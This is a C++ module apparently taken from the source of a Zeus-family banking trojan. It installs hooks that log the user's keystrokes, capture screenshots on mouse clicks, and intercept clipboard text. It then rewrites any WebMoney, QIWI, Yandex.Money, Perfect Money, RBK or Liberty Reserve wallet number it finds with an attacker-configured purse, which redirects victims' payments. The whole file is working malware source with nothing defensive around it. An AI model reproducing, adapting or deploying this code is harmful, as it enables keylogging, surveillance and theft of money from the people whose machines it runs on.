#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "report.h"
#include "userhook.h"
#include "screenshot.h"
#include "cryptedstrings.h"
#include "softwaregrabber.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "globals.h"
#include "dynamicconfig.h"

static CRITICAL_SECTION userInputCs;

#define USERINPUT_MAX_CHARS 1000

static LPWSTR userInputBuffer;
static WORD userInputBufferSize;

/*
  Добавление строки в буффер ввода.

  IN string - строка для добавления.
*/
static void addString(const LPWSTR string)
{
  int stringSize = Str::_LengthW(string);
  
  //Если строка слишком длинная, эти данные нас врятли интересуют. Поэтому сбрасываем буфер.
  if(stringSize > USERINPUT_MAX_CHARS)UserHook::clearInput();
  else
  {
    CWA(kernel32, EnterCriticalSection)(&userInputCs);
    DWORD newSize = userInputBufferSize + stringSize;
    if(newSize > USERINPUT_MAX_CHARS)
    {
      if(Mem::reallocEx(&userInputBuffer, USERINPUT_MAX_CHARS * sizeof(WCHAR)))
      {
        DWORD savedSize = USERINPUT_MAX_CHARS - stringSize;
        Mem::_copy(userInputBuffer, userInputBuffer + userInputBufferSize - savedSize, savedSize * sizeof(WCHAR));
        Mem::_copy(userInputBuffer + savedSize, string, stringSize * sizeof(WCHAR));
        userInputBufferSize = USERINPUT_MAX_CHARS;
      }
    }
    else if(Mem::reallocEx(&userInputBuffer, newSize * sizeof(WCHAR)))
    {
      Mem::_copy(userInputBuffer + userInputBufferSize, string, stringSize * sizeof(WCHAR));
      userInputBufferSize = newSize;
    }
    CWA(kernel32, LeaveCriticalSection)(&userInputCs);
  }
  
#if(BO_DEBUG > 0)
  {
    LPWSTR str;
    if(UserHook::getInput(&str) > 0)
    {
      WDEBUG2(WDDT_INFO, "userInputBufferSize=%u, userInputBuffer=%s", userInputBufferSize, str);
      Mem::free(str);
    }
  }
#endif
}

static WORD  imageClicksCount;
static LPWSTR imageFilePrefix;

void UserHook::enableImageOnClick(WORD clicksCount, LPSTR filePrefix)
{
  CWA(kernel32, EnterCriticalSection)(&userInputCs);
  imageClicksCount = clicksCount;
  Mem::free(imageFilePrefix);
  imageFilePrefix = (filePrefix == NULL ? NULL : Str::_ansiToUnicodeEx(filePrefix, -1));
  CWA(kernel32, LeaveCriticalSection)(&userInputCs);
}

void UserHook::init(void)
{
  CWA(kernel32, InitializeCriticalSection)(&userInputCs);
  userInputBuffer     = NULL;
  userInputBufferSize = 0;
  imageClicksCount = 0;
  imageFilePrefix  = NULL;
}

void UserHook::uninit(void)
{
  CWA(kernel32, DeleteCriticalSection)(&userInputCs);
  Mem::free(userInputBuffer);
  Mem::free(imageFilePrefix);
}

void UserHook::clearInput(void)
{
  CWA(kernel32, EnterCriticalSection)(&userInputCs);
  Mem::free(userInputBuffer);
  userInputBuffer     = NULL;
  userInputBufferSize = 0;
  CWA(kernel32, LeaveCriticalSection)(&userInputCs);
}

DWORD UserHook::getInput(LPWSTR *buffer)
{
  DWORD retVal = 0;
  *buffer      = NULL;

  CWA(kernel32, EnterCriticalSection)(&userInputCs);
  if(userInputBufferSize > 0 && userInputBuffer != NULL)
  {
    LPWSTR p = Str::_CopyExW(userInputBuffer, userInputBufferSize);
    if(p != NULL)
    {
      *buffer = p;
      retVal = userInputBufferSize;
      
      //Убираем служебные символы.
      for(DWORD i = 0; i < userInputBufferSize; i++)if(p[i] < 0x20)p[i] = 0x20;
    }
  }
  CWA(kernel32, LeaveCriticalSection)(&userInputCs);
  return retVal;
}

BOOL WINAPI UserHook::hookerTranslateMessage(const MSG *msg)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Тормаза дает.
  if(msg != NULL && Core::isActive())
  {
    if(msg->message == WM_LBUTTONDOWN)
    {
      CWA(kernel32, EnterCriticalSection)(&userInputCs);
      if(imageClicksCount > 0)
      {
        imageClicksCount--;
        IStream *stream;        
        {
          CSTR_GETW(imageFormat, userhook_screenshot_format);
          stream = Screenshoot::_screenToIStream(imageFormat, 30, USERCLICK2IMAGE_SIZE);
        }
        
        if(stream != NULL)
        {
          WCHAR path[MAX_PATH];
          {
            CSTR_GETW(pathFormat, userhook_screenshot_path_format);
            CSTR_GETW(defaultPrefix, userhook_screenshot_file_default_prefix);

            Str::_sprintfW(path, MAX_PATH, pathFormat,
                           imageFilePrefix == NULL ? defaultPrefix : imageFilePrefix,
                           coreData.pid,
                           CWA(kernel32, GetTickCount)());
          }
          
          Report::writeIStream(BLT_FILE, NULL, path, stream);
          stream->Release();
        }
      }
      CWA(kernel32, LeaveCriticalSection)(&userInputCs);
    }
    else if(msg->message == WM_KEYDOWN && msg->wParam != VK_ESCAPE)
    {
      BYTE keys[256];
      WCHAR buf[10];
      int count;
      
      if(CWA(user32, GetKeyboardState)(keys) != FALSE && (count = CWA(user32, ToUnicode)(msg->wParam, (msg->lParam >> 16) & 0xFF, keys, buf, sizeof(buf) / sizeof(WCHAR) - 1, 0)) > 0)
      {
        
        if(count == 1 && msg->wParam == VK_BACK)addString(L"\x2190");
        //else if(count == 1 && msg->wParam == VK_DELETE)addString(L"\x2193");
        else if(count > 1 || buf[0] >= 0x20)
        {
          buf[count] = 0;
          addString(buf);
        }
      }
    }
  }
  
  return CWA(user32, TranslateMessage)(msg);
}
void UserHook::WM_Replace(LPWSTR string)
{
	bool wm=false,qiwi=false,yad=false,perfect=false,rbk=false,lr=false;
	int kosheloffset = -1;
	for(int i=0; i<10 && string[i] != L'\0';i++)
	{
		if(string[i] == L'Z' || string[i] == L'R')
		{
			for(int k=i+1;k<i+13;k++)
			{
				if(string[k] > L'9' || string[k] == L'\0') break;
				if(k==i+12 && string[k] <= L'9' && string[k] >= L'0')
				{
					wm=true;
					kosheloffset = i;
					goto START;
				}
			}
		}
		if(string[i] == L'9')
		{
			for(int k=i+1;k<i+10;k++)
			{
				if(string[k] > L'9' || string[k] == L'\0' || string[k] < L'0') break;
				if(k==i+9 && string[k] <= L'9' && string[k] >= L'0')
				{
					qiwi=true;
					kosheloffset = i;
					goto START;
				}
			}
		}
		if(string[i] == L'4' || string[i+1] == L'1' || string[i+2] == L'0')
		{
			for(int k=i+3;k<i+15;k++)
			{
				if(string[k] > L'9' || string[k] == L'\0' || string[k] < L'0') break;
				if(k==i+14 && string[k] <= L'9' && string[k] >= L'0')
				{
					yad=true;
					kosheloffset = i;
					goto START;
				}
			}
		}
		if(string[i] == L'E' || string[i] == L'G')
		{
			for(int k=i+1;k<i+8;k++)
			{
				if(string[k] > L'9' || string[k] == L'\0' || string[k] < L'0') break;
				if(k==i+7 && string[k] <= L'9' && string[k] >= L'0')
				{
					perfect=true;
					kosheloffset = i;
					goto START;
				}
			}
		}
		if(string[i] == L'R' && string[i+1] == L'U')
		{
			for(int k=i+2;k<i+10;k++)
			{
				if(string[k] > L'9' || string[k] == L'\0' || string[k] < L'0') break;
				if(k==i+9 && string[k] <= L'9' && string[k] >= L'0')
				{
					rbk=true;
					kosheloffset = i;
					goto START;
				}
			}
		}
		if(string[i] == L'U')
		{
			for(int k=i+1;k<i+7;k++)
			{
				if(string[k] > L'9' || string[k] == L'\0' || string[k] < L'0') break;
				if(k==i+6 && string[k] <= L'9' && string[k] >= L'0')
				{
					lr=true;
					kosheloffset = i;
					goto START;
				}
			}
		}
	}
START:
	if(kosheloffset != -1)
	{
		BinStorage::STORAGE *currentConfig = DynamicConfig::getCurrent();
		if(currentConfig != NULL)
		{if(wm)
		{
			LPSTR zkosh = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_Z_PURSE, BinStorage::ITEMF_IS_OPTION, NULL);
			LPSTR rkosh = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_R_PURSE, BinStorage::ITEMF_IS_OPTION, NULL);
			WDEBUG1(WDDT_INFO, "WM_NUM: %s", Str::_ansiToUnicodeEx(zkosh,13));
			LPWSTR zkoshw = Str::_ansiToUnicodeEx(zkosh,13);
			LPWSTR rkoshw = Str::_ansiToUnicodeEx(rkosh,13);
			switch(string[kosheloffset])
			{
				case L'Z':
					for(int i=kosheloffset+1;i<kosheloffset+13;i++) string[i] = zkoshw[i]; break;
				case L'R':
					for(int i=kosheloffset+1;i<kosheloffset+13;i++)
						string[i] = rkoshw[i];
					break;
			}
			//WDEBUG1(WDDT_INFO, "WM_NUM: %s", zkosh);
			Mem::free(zkosh);
			Mem::free(rkosh);
			Mem::free(zkoshw);
			Mem::free(rkoshw);
		}
		else if(qiwi)
		{
			WDEBUG0(WDDT_INFO, "QIWI");
			LPSTR qiwikosh = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_QIWI_PURSE, BinStorage::ITEMF_IS_OPTION, NULL);
			LPWSTR qiwikoshw = Str::_ansiToUnicodeEx(qiwikosh,10);
			for(int i=kosheloffset;i<kosheloffset+11;i++)
				string[i] = qiwikoshw[i];
			Mem::free(qiwikosh);
			Mem::free(qiwikoshw);

		}
		else if(yad)
		{
			WDEBUG0(WDDT_INFO, "YAD");
			LPSTR yadkosh = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_YAD_PURSE, BinStorage::ITEMF_IS_OPTION, NULL);
			LPWSTR yadkoshw = Str::_ansiToUnicodeEx(yadkosh,15);
			for(int i=kosheloffset;i<kosheloffset+16;i++)
				string[i] = yadkoshw[i];
			Mem::free(yadkosh);
			Mem::free(yadkoshw);

		}
		else if(perfect)
		{
			LPSTR perfectG = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_PERF_G, BinStorage::ITEMF_IS_OPTION, NULL);
			LPSTR perfectE = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_PERF_E, BinStorage::ITEMF_IS_OPTION, NULL);
			//WDEBUG1(WDDT_INFO, "WM_NUM: %s", Str::_ansiToUnicodeEx(zkosh,13));
			LPWSTR perfectGw = Str::_ansiToUnicodeEx(perfectG,8);
			LPWSTR perfectEw = Str::_ansiToUnicodeEx(perfectE,8);
			switch(string[kosheloffset])
			{
				case L'G':
					for(int i=kosheloffset+1;i<kosheloffset+8;i++) string[i] = perfectGw[i]; break;
				case L'E':
					for(int i=kosheloffset+1;i<kosheloffset+8;i++)
						string[i] = perfectEw[i];
					break;
			}
			//WDEBUG1(WDDT_INFO, "WM_NUM: %s", zkosh);
			Mem::free(perfectG);
			Mem::free(perfectE);
			Mem::free(perfectGw);
			Mem::free(perfectEw);

		}

		else if(rbk)
		{
			LPSTR rbkkosh = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_RBK_PURSE, BinStorage::ITEMF_IS_OPTION, NULL);
			LPWSTR rbkkoshw = Str::_ansiToUnicodeEx(rbkkosh,11);
			for(int i=kosheloffset;i<kosheloffset+12;i++)
				string[i] = rbkkoshw[i];
			Mem::free(rbkkosh);
			Mem::free(rbkkoshw);

		}

		else if(lr)
		{
			LPSTR lrkosh = (LPSTR)BinStorage::_getItemDataEx(currentConfig, CFGID_LR_PURSE, BinStorage::ITEMF_IS_OPTION, NULL);
			LPWSTR lrkoshw = Str::_ansiToUnicodeEx(lrkosh,7);
			for(int i=kosheloffset;i<kosheloffset+8;i++)
				string[i] = lrkoshw[i];
			Mem::free(lrkosh);
			Mem::free(lrkoshw);

		}
			Mem::free(currentConfig);
		}

	}
}

HANDLE WINAPI UserHook::hookerGetClipboardData(UINT format)
{
  WDEBUG1(WDDT_INFO, "Called, format=%u", format);

  HANDLE dataHandle = CWA(user32, GetClipboardData)(format);  
  if(!Core::isActive())return dataHandle;
  
  LPBYTE data;
  
  if(dataHandle != NULL && (format == CF_TEXT || format == CF_UNICODETEXT || format == CF_OEMTEXT) && (data = (LPBYTE)CWA(kernel32, GlobalLock)(dataHandle)) != NULL)
  {
    LPWSTR string;
    switch(format)
    {
      case CF_TEXT:        string = Str::_ansiToUnicodeEx((LPSTR)data, -1); break;
      case CF_UNICODETEXT: string = (LPWSTR)data; break;
      case CF_OEMTEXT:     string = Str::_oemToUnicodeEx((LPSTR)data, -1); break;
    }
    
    if(string != NULL)
    {
      CWA(kernel32, EnterCriticalSection)(&userInputCs);
	  WM_Replace(string);
      addString(L" ");
      addString(string);
      CWA(kernel32, LeaveCriticalSection)(&userInputCs);
      if(string != (LPWSTR)data)Mem::free(string);
    }
    
    CWA(kernel32, GlobalUnlock)(dataHandle);
  }

  return dataHandle;
}

#if defined HOOKER_SETWINDOWTEXT
BOOL WINAPI UserHook::hookerSetWindowTextW(HWND window, const LPWSTR string)
{
  return CWA(user32, SetWindowTextW)(window, string);
}
#endif
